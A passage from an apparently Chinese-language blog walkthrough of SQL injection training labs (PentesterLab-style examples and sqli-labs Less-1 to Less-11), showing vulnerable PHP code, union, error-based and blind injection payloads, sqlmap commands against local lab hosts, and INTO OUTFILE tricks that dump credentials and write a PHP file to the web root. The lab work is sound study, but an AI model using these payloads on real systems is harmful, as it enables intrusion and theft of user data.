REQUIRED"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>] ;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td>where id = X</td></tr></tbody></table><p>这里和 Example 5 差不多，只是这里确保 id 的值以数字结束，看看我们的上一关的 payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example6.php?id=2 and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5</span><br></pre></td></tr></table></figure><p>恰巧是以数字 5 结束，所以这个正则就很画蛇添足</p><h2 id="Example-7-m-正则缺陷-Bypass"><a href="#Example-7-m-正则缺陷-Bypass" class="headerlink" title="Example 7 /m 正则缺陷 Bypass"></a>Example 7 <code>/m</code> 正则缺陷 Bypass</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td>where id = X</td></tr></tbody></table><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^-?[0-9]+$/m'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>];</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure><p>id 只允许 <code>233</code> 或者 <code>-233</code> 这样的形式，这样肯定是无法进行注入的了。天无绝人之路，仔细观察 这里使用了 <code>/m</code> ，<code>/m</code>表示开启多行匹配模式，正常情况下<code>^</code> 和<code>$</code> 是匹配字符串的开始和结尾，开启多行模式之后，多行模式<code>^</code>,<code>$</code>可以匹配每行的开头和结尾。我们常用：</p><ul><li>%0A 换行</li></ul><p>来绕过 <code>/m</code> 模式的正则检测，完整的 payload 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example7.php?id=-2%0a union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5</span><br></pre></td></tr></table></figure><p>使用 sqlmap 也是可以正常进行注入的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://10.211.55.20/sqli/example7.php?id=2"</span> --technique=U --dbms=MySQL --prefix=<span class="string">"%0a"</span> --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure><h2 id="Example-8-order-by-盲注"><a href="#Example-8-order-by-盲注" class="headerlink" title="Example 8 order by 盲注"></a>Example 8 order by 盲注</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY `"</span>;</span><br><span class="line">$sql .= mysql_real_escape_string($_GET[<span class="string">"order"</span>]).<span class="string">"`"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td>order by <code>X</code></td></tr></tbody></table><p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。不过注入方式也十分灵活，下面在本关来详细讲解一下。这里并没有输出报错日志，这里只能使用盲注，效率要低一些，国光这里使用布尔类型盲注来简单尝试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库第 1 位的 ascii 码为 101 即 e</span></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;100) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;101) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库第 2 位的 ascii 码为 120 即 x</span></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;119) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;120) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>直接用 sqlmap 当然也是可以跑起来的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://10.211.55.20/sqli/example8.php?order=name"</span> --technique=B --dbms=MySQL --prefix=<span class="string">'`'</span> --random-agent --flush-session -v 3 --level 3</span><br></pre></td></tr></table></figure><h2 id="Example-9-order-by-盲注"><a href="#Example-9-order-by-盲注" class="headerlink" title="Example 9 order by 盲注"></a>Example 9 order by 盲注</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY "</span>;</span><br><span class="line">$sql .= mysql_real_escape_string($_GET[<span class="string">"order"</span>]);</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td>order by X</td></tr></tbody></table><p>比 Example 8 更简单，这里没有奇怪的闭合拼接方式就直接导入到 SQL 语句中了，下面直接开始注入吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库第 1 位的 ascii 码为 101 即 e</span></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;100) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;101) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库第 2 位的 ascii 码为 120 即 x</span></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;119) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;120) THEN 0x6e616d65 ELSE 0x28 END))</span><br></pre></td></tr></table></figure><p>直接用 sqlmap 当然也是可以跑起来的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://10.211.55.20/sqli/example9.php?order=name"</span> --technique=B --dbms=MySQL --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure><h1 id="Sqli-labs-靶场通关记录"><a href="#Sqli-labs-靶场通关记录" class="headerlink" title="Sqli-labs 靶场通关记录"></a>Sqli-labs 靶场通关记录</h1><h2 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单引号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持联合、报错、布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出查询内容</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h4 id="报错注入1"><a href="#报错注入1" class="headerlink" title="报错注入1"></a>报错注入1</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br></pre></td></tr></table></figure><h4 id="报错注入2"><a href="#报错注入2" class="headerlink" title="报错注入2"></a>报错注入2</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1--+</span><br></pre></td></tr></table></figure><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>数据库第一个字母为 <code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and left(database(),1)&gt;&apos;r&apos;--+</span><br><span class="line">?id=1&apos; and left(database(),1)&gt;&apos;s&apos;--+</span><br></pre></td></tr></table></figure><h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+</span><br><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p><strong>联合查询注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</span><br></pre></td></tr></table></figure><p><strong>布尔盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure><p><strong>延时盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。</p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。</p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先双引号 在括号拼接</span></span><br><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持联合、报错、布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出查询内容</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接单引号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持报错、布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出 You are in...........</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致，这里即不再啰嗦了。</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-5 利用方式一致，只是闭合方式不一样，这里即不再啰嗦了。</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用单引号加双层括号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出 You are in.... <span class="keyword">Use</span> <span class="title">outfile</span>......</span><br><span class="line"><span class="title">else</span>:</span><br><span class="line">    输出 <span class="title">You</span> <span class="title">have</span> <span class="title">an</span> <span class="title">error</span> <span class="title">in</span> <span class="title">your</span> <span class="title">SQL</span> <span class="title">syntax</span></span><br><span class="line">  //<span class="title">print_r</span>(<span class="title">mysql_error</span>());</span><br></pre></td></tr></table></figure><p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>盲注还是常规思路，这里实际上和前面的是一样的，就再啰嗦一下，使用 sqlmap 直接验证看看：</p><p><strong>布尔盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure><p>sqlmap 的 Payload 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;) AND 3542=3542 AND (&apos;rmsD&apos;=&apos;rmsD</span><br></pre></td></tr></table></figure><p><strong>延时盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure><p>sqlmap 的 Payload 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;) AND (SELECT 9943 FROM (SELECT(SLEEP(5)))XOYy) AND (&apos;QUpy&apos;=&apos;QUpy</span><br></pre></td></tr></table></figure><h4 id="导出数据到文件"><a href="#导出数据到文件" class="headerlink" title="导出数据到文件"></a>导出数据到文件</h4><p>因为这一关作者很明显地提示了如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure><p>所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下，这个 Docker 靶机理论上应该是开启的，进入容器验证一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysql -e "show global variables like '%secure%';"</span></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure><ul><li>ure_file_priv 的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li><li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li></ul><p>下面开始直接将数据库里面的信息导出到文件中吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&apos;))+UNION+SELECT * from security.users INTO OUTFILE &quot;users.txt&quot;--+</span><br></pre></td></tr></table></figure><p>因为导出没有指定路径，所以 Linux 下 MySQL 默认导出的路径为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/mysql/security</span><br></pre></td></tr></table></figure><p>查看下是否将数据库信息导出到文件中了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/lib/mysql/security/users.txt</span><br><span class="line">1    Dumb    Dumb</span><br><span class="line">2    Angelina    I-kill-you</span><br><span class="line">3    Dummy    p@ssword</span><br><span class="line">4    secure    crappy</span><br><span class="line">5    stupid    stupidity</span><br><span class="line">6    superman    genious</span><br><span class="line">7    batman    mob!le</span><br><span class="line">8    admin    admin</span><br><span class="line">9    admin1    admin1</span><br><span class="line">10    admin2    admin2</span><br><span class="line">11    admin3    admin3</span><br><span class="line">12    dhakkan    dumbo</span><br><span class="line">14    admin4    admin4</span><br></pre></td></tr></table></figure><p>但是这样并没有什么实际的作用，因为这个路径我们同过 Web 是无法访问的，所以这个导出的信息尽管是成功的，但是访问不到这个信息就白白作废了。</p><p>所以一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&apos;))+UNION+SELECT * from security.users INTO OUTFILE &quot;/var/www/html/Less-7/users.txt&quot;--+</span><br></pre></td></tr></table></figure><p>这里因为这个 Docker 靶场环境没有配置好权限问题，我们通过 MySQL 直接往 Web 目录下写文件会是失败的，提示如下信息：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syntaxCan't create/write to file</span><br></pre></td></tr></table></figure><p>这个时候为了演示这个效果，这里只能进容器来手动把权限给开一下了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure><p>然后再执行上面的语句应该是可以成功的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1:8888/Less-7/users.txt</span><br><span class="line">1    Dumb    Dumb</span><br><span class="line">2    Angelina    I-kill-you</span><br><span class="line">3    Dummy    p@ssword</span><br><span class="line">4    secure    crappy</span><br><span class="line">5    stupid    stupidity</span><br><span class="line">6    superman    genious</span><br><span class="line">7    batman    mob!le</span><br><span class="line">8    admin    admin</span><br><span class="line">9    admin1    admin1</span><br><span class="line">10    admin2    admin2</span><br><span class="line">11    admin3    admin3</span><br><span class="line">12    dhakkan    dumbo</span><br><span class="line">14    admin4    admin4</span><br></pre></td></tr></table></figure><p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1'))+UNION+<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"&lt;?php phpinfo();?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">"/var/www/html/Less-7/info.php"</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>访问对应的 URL 看看是否解析了呢：</p><p><img src="http://qiniuyun.lintstar.top/15893696834265.png" alt="15893696834265"></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样，这里国光就不再啰嗦了。</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样，这里国光就不再啰嗦了。</p><p><strong>源码简单分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用单引号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出 You are in............</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    输出 You are in...........</span><br></pre></td></tr></table></figure><p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入。延时注入细节可以参考 Less-1 的注入细节。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先使用双引号再直接拼接</span></span><br><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出 You are in............</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    输出 You are in...........</span><br></pre></td></tr></table></figure><p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 